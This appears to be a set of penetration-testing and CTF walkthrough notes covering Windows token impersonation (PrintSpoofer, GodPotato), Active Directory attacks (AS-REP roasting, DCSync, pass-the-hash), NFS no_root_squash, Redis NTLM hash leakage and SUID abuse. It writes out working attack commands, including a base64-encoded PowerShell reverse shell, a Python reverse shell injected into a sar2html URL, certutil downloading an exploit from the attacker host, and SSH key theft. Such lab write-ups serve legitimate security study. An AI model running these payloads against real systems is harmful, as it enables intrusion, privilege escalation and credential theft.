<highlight>SeImpersonatePrivilege</highlight> is a Windows privilege that allows a process to 'impersonate' a client after authentication. While intended for service accounts (like IIS) to access resources on behalf of users, an attacker can abuse it to steal a <highlight>SYSTEM Token</highlight> and escalate privileges.
Identifying the Privilege

blocks.code:
Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled

blocks.text: If <highlight>SeImpersonatePrivilege</highlight> is listed as <highlight>Enabled</highlight>, the account has the power to adopt the identity of any process that connects to it. This is common in service accounts but rare for standard users.
Choosing the Exploit: PrintSpoofer

For Windows Server 2016, 2019, and Windows 10, <highlight>PrintSpoofer</highlight> is the most reliable tool. It tricks the <highlight>Print Spooler</highlight> service (running as SYSTEM) into connecting to a malicious named pipe, allowing the attacker to steal its token.
Executing the Escalation

[+] Named pipe listening...
[+] CreateProcessAsUser() OK

C:\Windows\system32> whoami
nt authority\system

blocks.text: The <highlight>-i</highlight> flag interacts with the new shell, and <highlight>-c cmd</highlight> specifies the command to execute. Successfully stealing the token results in an immediate transition to <highlight>NT AUTHORITY\SYSTEM</highlight>.
Alternative: Escalation to Reverse Shell

Spawning a <highlight>SYSTEM</highlight> shell inside an existing 'dumb' shell can be unstable. Using the exploit to trigger a <highlight>Netcat</highlight> reverse shell back to Kali provides a more stable, high-privileged management session.
User Identity and Privilege Enumeration

The <highlight>whoami</highlight> command identifies the current logged-in user. Adding the <highlight>/priv</highlight> flag is the most critical step in Windows privilege escalation as it reveals hidden system 'superpowers' assigned to the account.

blocks.text: Reading File Contents
In Windows CMD, <highlight>type</highlight> is used to display the contents of a text file directly in the terminal, equivalent to the Linux <highlight>cat</highlight> command.
Searching for Sensitive Files
The <highlight>where /R</highlight> command is used to recursively search for a file from a specific starting directory. This is useful for finding hidden flags or configuration files.
The Necessity of Active Directory (AD) in Enterprise Networks

In a small network of 5 computers, manual configuration is feasible. However, in a corporate environment with <highlight>100+ computers and 300+ users</highlight>, managing individual local accounts is impossible. <highlight>Active Directory (AD)</highlight> solves this by providing a centralized repository for all network data.

The <highlight>Domain Controller (DC)</highlight> serves as the brain of the network. When a user enters credentials on any workstation, the machine does not check its own local database; it sends an <highlight>Authentication Request</highlight> to the DC, which verifies the user against the AD database.
AD Objects and Logical Organization

Every entity in AD is an <highlight>Object</highlight>. This includes <highlight>Users</highlight> (identities), <highlight>Computers</highlight> (workstations/servers), and <highlight>Printers</highlight>. Managing these individually is inefficient, leading to the use of <highlight>Groups</highlight> for bulk permission assignment.

An <highlight>Organizational Unit (OU)</highlight> is a logical container (folder) used to categorize objects. While Groups are used for <highlight>Permissions</highlight> (e.g., 'who can access this file'), OUs are primarily used for <highlight>Management and Policy Application</highlight> (e.g., 'all computers in the HR_OU must have USBs disabled').
Group Policy Objects (GPO) and Remote Administration

A <highlight>Group Policy Object (GPO)</highlight> is a virtual rulebook. Administrators create a GPO to define specific settings—such as password complexity requirements, software installation, or desktop wallpapers—and <highlight>link</highlight> them to an OU.

A common misconception is linking GPOs to Groups. In AD, <highlight>GPOs must be linked to OUs</highlight>. If a user is a member of multiple groups but resides in the 'IT_Dept_OU', only the GPOs linked to that OU (and its parent containers) will govern their system environment.
Trees, Forests, and Trust Relationships

A <highlight>Tree</highlight> is a set of domains sharing a contiguous DNS namespace. A <highlight>Forest</highlight> is the top-level container, acting as the security boundary for the entire organization. Multiple Forests can interact through <highlight>Trusts</highlight>.

<highlight>One-Way Trust</highlight> allows one domain to trust another's users without reciprocal access. <highlight>Two-Way Trust</highlight> allows mutual resource sharing. <highlight>Transitive Trusts</highlight> create a chain of trust (If A trusts B and B trusts C, A trusts C), whereas <highlight>Non-Transitive Trusts</highlight> restrict access strictly to the two participating domains.
Service Accounts and the Path to Domain Admin

<highlight>Service Accounts</highlight> are often high-value targets because they run critical applications (SQL, IIS). To ensure 24/7 uptime, administrators rarely rotate their passwords, which are often <highlight>weak or default</highlight>, making them susceptible to Kerberoasting attacks.

The ultimate goal in AD hacking is <highlight>Domain Admin</highlight>. Attackers often seek intermediate privileges like <highlight>Backup Operator</highlight>. This role allows the bypass of security descriptors to copy the <highlight>ntds.dit</highlight> file from the DC, which contains hashes for all domain users, including the Domain Admin.
Enumeration and Path Analysis

Enumeration involves mapping users, computers, and permissions. Tools like <highlight>BloodHound</highlight> use graph theory to find 'hidden' paths to Admin status, such as a user having <highlight>GenericWrite</highlight> permissions over a more privileged object, allowing for an immediate password reset or takeover.
NFS (Network File System) Exploitation & Privilege Escalation

NFS is a protocol used to share files over a network. Misconfigurations like <highlight>no_root_squash</highlight> allow low-privileged users to gain <highlight>root</highlight> access by manipulating file ownership.
Phase 1: Service Enumeration
Nmap confirms port 2049 is open. The showmount command reveals the /home directory is exported to everyone (*).
Phase 2: Mounting the Remote Share
The remote /home directory is mounted locally to /tmp/nfs_mount using the -nolock flag to bypass locking issues.
Phase 3: Gaining Initial Access (SSH Key Harvesting)

blocks.code:
ls -la /tmp/nfs_mount/cappucino/.ssh
cp /tmp/nfs_mount/cappucino/.ssh/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa cappucino@<TARGET_IP>

blocks.text: A private SSH key was found in the mounted share, providing a low-privileged shell as user cappucino.
Phase 4: Privilege Escalation (no_root_squash)
The 'no_root_squash' option tells the server to trust the client's root user, allowing the creation of root-owned SUID binaries.

blocks.code:
sudo cp /bin/bash /tmp/nfs_mount/bash
sudo chown root:root /tmp/nfs_mount/bash
sudo chmod +s /tmp/nfs_mount/bash

blocks.text: A bash binary was copied to the mount, assigned root ownership, and given the SUID bit (+s) on the attacker machine.
Executing the Root Shell
The SUID bash binary executes with root privileges on the target server, granting full administrative access.

blocks.text: Active Directory Exploitation: From AS-REP Roasting to Domain Admin

This attack path demonstrates how misconfigured Kerberos settings and excessive user privileges can lead to a full domain compromise. Key techniques include <highlight>AS-REP Roasting</highlight>, <highlight>DCSync</highlight> via DRSUAPI, and <highlight>Pass-the-Hash</highlight>.
Phase 1: Domain Enumeration & User Discovery
Using Kerbrute for user enumeration helps identify valid usernames. Notable accounts discovered: <highlight>svc-admin</highlight> and <highlight>backup</highlight>.
Phase 2: AS-REP Roasting (Targeting svc-admin)

AS-REP Roasting occurs when an account has <highlight>Do not require Kerberos pre-authentication</highlight> enabled. We can request an Authentication Service Response (AS-REP) without a password and crack the encrypted part offline.
The retrieved hash is type <highlight>Kerberos 5, etype 23, AS-REP</highlight> (Mode 18200 in Hashcat). Cracking it reveals the password: <highlight>management2005</highlight>.
Phase 3: SMB Share Enumeration & Credential Harvesting
Accessing the 'backup' share reveals a file containing a Base64 encoded string. Decoding it provides the password for the <highlight>backup</highlight> user.
Phase 4: Domain Privilege Escalation (DCSync)

The <highlight>backup</highlight> user has replication privileges. Using the <highlight>DRSUAPI</highlight> method, we can impersonate a Domain Controller and request the entire <highlight>NTDS.DIT</highlight> database.
Phase 5: Final Compromise (Pass-the-Hash)
With the Administrator's NTLM hash, we can authenticate without cracking the password using the <highlight>Pass-the-Hash</highlight> method.
Capturing the Flags
Summary of Attack Path

blocks.text: Phase 1: Redis Enumeration & NTLM Leakage

Redis (Remote Dictionary Server) is an in-memory data structure store. When left unauthenticated (Anonymous Access), it becomes a high-risk vector for <highlight>Configuration Poisoning</highlight>. In Windows environments, we can manipulate Redis to interact with a remote UNC path, forcing the underlying service account to leak its <highlight>Net-NTLMv2 hash</highlight> via the SMB protocol.
Step 1: Identifying Anonymous Redis Access & Parameters

We begin by checking if the Redis service on port <highlight>6379</highlight> allows connections without a password. Once connected, we use the <highlight>config get *</highlight> command to enumerate available parameters. This confirms the current working directory and database filename settings.

blocks.code:
redis-cli -h <TARGET_IP>
config get dir
config get dbfilename

blocks.text: Step 2: Triggering NTLM Authentication Leak

To capture the hash, we initiate <highlight>Responder</highlight> on our Kali machine. This tool acts as a rogue SMB server. Even without a real shared folder, Responder will intercept any incoming SMB handshake requests from the target.

Executing <highlight>config set dir</highlight> only updates the setting in memory and does not generate network traffic. To force a connection, we must trigger a file-write operation. By setting a <highlight>dbfilename</highlight> and issuing the <highlight>save</highlight> command, Windows is forced to authenticate with our rogue share to check for write permissions, thus leaking the hash.

blocks.code:
config set dir \\<KALI_IP>\share
config set dbfilename redis.rdb
save

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.154.40
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:4e51...000000000000000000000000000

blocks.text: Step 3: Offline Brute-Force Cracking

The captured Net-NTLMv2 hash cannot be used for 'Pass-the-Hash' attacks. We must perform an offline dictionary attack using <highlight>John the Ripper</highlight> and the <highlight>RockYou.txt</highlight> wordlist to recover the cleartext password.

sand_0873959498  (enterprise-security)
1 password cracked, 0 left

Discovery: Used 'config get' to identify modifiable backup parameters
Mechanism: Triggered an SMB write request via the 'save' command to leak NTLMv2 hashes
Result: Gained valid domain credentials (VULNNET\enterprise-security) after offline cracking

blocks.text: Remote Access: Establishing a Shell via WinRM

WinRM (Windows Remote Management) is a Microsoft protocol that allows for remote management of systems over HTTP/HTTPS. Using <highlight>Evil-WinRM</highlight>, we can obtain an interactive PowerShell session if we have valid user credentials or their NTLM hashes.
Method 1: Authentication via Plaintext Password
When we have recovered the cleartext password (e.g., through cracking a hash with John the Ripper), we can log in directly. This provides a full interactive PowerShell environment.

blocks.text: Method 2: Authentication via Pass-the-Hash (PtH)

In many cases, we might capture an NTLM hash (e.g., from Mimikatz or SecretsDump) but cannot crack it. WinRM allows us to use the <highlight>NTLM hash</highlight> itself for authentication without ever needing the original password.
Note: When using the <highlight>-H</highlight> flag, you only need the NT portion of the hash (the last part of a standard LM:NT string).

blocks.text: Phase 3: Privilege Escalation (GodPotato)

The discovery of <highlight>SeImpersonatePrivilege</highlight> is a critical finding. This privilege allows a process to impersonate a client after authentication. By using an exploit from the 'Potato' family, we can trick a SYSTEM-level service into authenticating with us, capturing its token, and spawning a shell as <highlight>NT AUTHORITY\SYSTEM</highlight>.
Step 1: Transferring the Exploit to Target
We move the <highlight>GodPotato-Net4.exe</highlight> binary from our Kali machine to the Windows target using <highlight>certutil.exe</highlight>.

blocks.code:
# On Kali (Start a web server)
python3 -m http.server 80

# On Windows Shell
certutil -urlcache -f http://<KALI_IP>/GodPotato-Net4.exe gp.exe

blocks.text: Step 2: Executing GodPotato for SYSTEM Shell
First, we verify the exploit works by running a simple <highlight>whoami</highlight>. If successful, it confirms we can impersonate the SYSTEM token.

blocks.code:
[*] Starting the DCOM server...
[*] Triggering the authentication...
[*] Impersonating the SYSTEM token...
nt authority\system

blocks.text: Step 2.1: The Raw Reverse Shell Payload

We use GodPotato to execute a PowerShell reverse shell one-liner. However, directly passing complex symbols like <highlight>$</highlight>, <highlight>"</highlight>, and <highlight>()</highlight> inside the <highlight>-cmd</highlight> flag often causes the command to break or get blocked by security filters.
Step 2.2: Encoding for Stability (Base64)

To ensure the shell executes correctly and bypasses simple syntax errors, we must convert the raw payload into <highlight>Base64 (UTF-16LE)</highlight>. This allows us to use the <highlight>-EncodedCommand</highlight> flag, making the execution much more stable under GodPotato.

blocks.code:
# On Kali: Convert the raw shell to Base64
echo -n '$c=New-Object Net.Sockets.TCPClient("<KALI_IP>",9001);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=([Text.Encoding]::ASCII).GetBytes($sb);$s.Write($sb2,0,$sb2.Length);$s.Flush()};$c.Close()' | iconv -t utf-16le | base64 -w 0

# Execute the Encoded Payload via GodPotato
.\gp.exe -cmd "powershell -EncodedCommand <BASE64_STRING>"

blocks.text: Step 3: Systematic Root Flag Capture
With SYSTEM privileges, we perform a final enumeration to list all users, identify their directories, and locate the root flag filename before reading its content.

.\gp.exe -cmd "cmd.exe /c net user"

# 2. List the Users directory to check folder structure
.\gp.exe -cmd "cmd.exe /c dir C:\Users"

# 3. List the Administrator's Desktop to find the root flag name
.\gp.exe -cmd "cmd.exe /c dir C:\Users\Administrator\Desktop"

# 4. Final Capture: Read the root flag content
.\gp.exe -cmd "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt"

blocks.text: Phase 1: Exploiting sar2html (Remote Code Execution)

The discovery of <highlight>sar2html</highlight> in a hidden directory is the primary entry point. This application is vulnerable to <highlight>Remote Code Execution (RCE)</highlight> via the 'plot' parameter. By appending a semicolon followed by a system command to the URL, we can force the server to execute arbitrary bash commands as the <highlight>www-data</highlight> user.
Step 1: Verifying the Vulnerability (PoC)

We test for RCE by injecting a simple <highlight>id</highlight> or <highlight>pwd</highlight> command into the URL. If the server is vulnerable, the command output will appear within the 'Select Plot' dropdown menu or the page source.
Step 2: Gaining a Reverse Shell

Once RCE is confirmed, we use a <highlight>Python3</highlight> one-liner to establish a reverse connection back to our Kali machine. This provides a more stable interactive environment than the URL bar.

blocks.code:
# Injecting the Python3 Reverse Shell (URL Encoded)
index.php?plot=;python3%20-c%20'import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

blocks.text: Step 3: Upgrading to a TTY Shell
A standard netcat shell is 'dumb' (no tab-completion or arrow keys). We upgrade it to a full <highlight>TTY</highlight> shell using Python and terminal state manipulation.

blocks.code:
# Inside the netcat shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Press Ctrl+Z to background, then:
stty raw -echo; fg

# Inside the shell again:
export TERM=xterm

blocks.text: Phase 1: Privilege Escalation via SUID (find)

The discovery of a misconfigured <highlight>SUID</highlight> bit on a system binary is a high-impact privilege escalation vector. By running a search for binaries with the <highlight>4000</highlight> permission bit, we can identify binaries like <highlight>/usr/bin/find</highlight> that allow us to execute commands with root privileges directly from a low-privileged user account.
Step 1: Identifying Vulnerable Binaries

We use the <highlight>find</highlight> command to scan the file system for any file with the SUID bit set. This search specifically looks for files where the owner is root but any user can execute the file with the owner's permissions.
Step 2: Executing the find Escape

The <highlight>-exec</highlight> flag in <highlight>find</highlight> runs a command on every file found. By pointing it at a single dot (current directory) and telling it to run <highlight>/bin/sh -p</highlight>, we force the SUID binary to spawn a privileged shell.
Step 3: Verification and Flag Capture
Success is confirmed when <highlight>whoami</highlight> returns root. From here, we can access the root home directory to capture the final flag.

blocks.code:
# Check current user and grab flag
whoami
cd /root
ls -la
cat .secret

blocks.title: Exploit Takeaways
items: Vulnerability: Incorrect file permissions (SUID bit on functional binaries)
Discovery: Always check SUID bits during post-exploitation enumeration
Technique: Use the binary's native functionality (-exec) to escape restricted environments
Defense: Never set the SUID bit on binaries that allow shell access or command execution

blocks.text: Phase 0: Triple-Layered Obfuscation (Decimal > Base64 > Plaintext)

We encountered a string of <highlight>Decimal ASCII codes</highlight>. This requires a three-step extraction process: converting decimals to characters, decoding the resulting <highlight>Base64</highlight> string, and finally reading the hidden plaintext message.
Step 1: Decimal to ASCII Conversion

The input consists of space-separated decimal values. Using <highlight>awk</highlight> with the <highlight>printf "%c"</highlight> function, we iterate through each field to convert the numbers into their corresponding ASCII characters.

blocks.code:
# Converting Decimal to a Base64 String
echo "079 084 10..." | awk '{for(i=1;i<=NF;i++) printf "%c", $i}'

blocks.text: Step 2: Decoding the Intermediate Base64
The output from Step 1 is a Base64 string. We pipe this directly into <highlight>base64 -d</highlight> to reveal the final hidden message.

blocks.title: Analysis of the Technique
items: Decimal Identification: Numbers in the 032-126 range usually represent printable ASCII.
Pipeline Efficiency: Using pipes (|) allows for rapid testing of different decoding layers.
Automation: In a real scenario, CyberChef's 'Magic' tool can often automate this entire sequence.

blocks.text: Special Technique: Identifying and Breaking ROT-2 Obfuscation

Cybersecurity mein jab koi string <highlight>Base64</highlight> jaisi dikhay par decode na ho, toh aksar us par <highlight>Caesar Cipher (ROT)</highlight> apply kiya gaya hota hai. ROT-2 ka matlab hai ke alphabet ko 2 positions aagay shift kiya gaya hai (A banta hai C, B banta hai D).
Step 1: How to Spot ROT-2 (Pattern Matching)
Standard Base64 prefixes ko target string se compare karein. Agar difference hamesha <highlight>2 letters</highlight> ka hai, toh yeh confirm ROT-2 hai.

blocks.title: Common ROT-2 Detection Patterns
items: Target: 'VjJ' ---> Standard: 'V2h' (Word: 'Who') [j - h = 2]
Target: 'SVRv' ---> Standard: 'QWRt' (Word: 'Admin') [S - Q = 2]
Target: 'jTVV' ---> Standard: 'aHR0' (Word: 'http') [j - h = 2]

blocks.text: Step 2: Reversing the Shift using 'tr'
Alphabet ko 2 positions peeche lane ke liye hum <highlight>tr</highlight> (translate) utility use karte hain. Hum system ko batate hain ke 'c' se start hone wali series ko 'a' se map karein.
Step 3: Real-World Example (Boiler-CTF)

blocks.code:
# Full Chain: ROT-2 Translate then Base64 Decode
echo "VjJodmNITnBaU0JrWVdsemVRbz0K" | tr 'c-za-bC-ZA-B' 'a-zA-Z' | base64 -d

# Result: Whoopsie daisy

Manual Shift: Agar standard tools fail hon, toh pehle 3 letters ka manual alphabet count check karein.
Automation: CyberChef mein 'ROT13' recipe use karke 'Amount' ko 2 set karne se bhi yeh solve ho jata hai.

blocks.text: Custom SUID Binary Privilege Escalation (Checker)

The <highlight>checker</highlight> binary is a custom SUID executable. Unlike standard Linux tools, it contains a logic flaw where it grants root access based on the presence of a user-controlled <highlight>environment variable</highlight>.
Discovery and Reverse Engineering

blocks.code:
# Find SUID binaries and filter for custom ones
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Analyze the binary strings for logic clues
strings /usr/sbin/checker

blocks.text: Analysis of <highlight>strings</highlight> reveals critical functions: <highlight>getenv</highlight>, <highlight>setuid</highlight>, and <highlight>system</highlight>, along with the string <highlight>admin</highlight>. This suggests the binary checks for an 'admin' variable before spawning a shell.
Exploitation Steps

blocks.code:
# 1. Export the required environment variable
export admin=1

# 2. Execute the SUID binary
/usr/sbin/checker

# 3. Verify root access
id

blocks.text: By using <highlight>export</highlight>, the 'admin' variable is passed to the binary's process. The binary calls <highlight>setuid(0)</highlight> to escalate to root permissions before executing <highlight>/bin/bash</highlight> via the system() call.
Summary of Attack Path
